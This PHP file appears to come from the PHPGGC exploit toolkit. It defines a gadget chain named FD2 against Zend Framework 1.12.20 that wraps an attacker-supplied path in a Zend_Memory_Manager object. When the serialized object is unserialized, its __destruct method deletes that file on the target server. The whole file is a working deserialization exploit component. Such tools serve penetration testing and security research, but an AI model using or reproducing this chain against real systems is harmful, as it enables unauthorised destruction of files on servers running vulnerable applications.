<?php

namespace GadgetChain\ZendFramework;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '1.12.20';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $file = $parameters['remote_path'];

        return new \Zend_Memory_Manager($file);
    }
}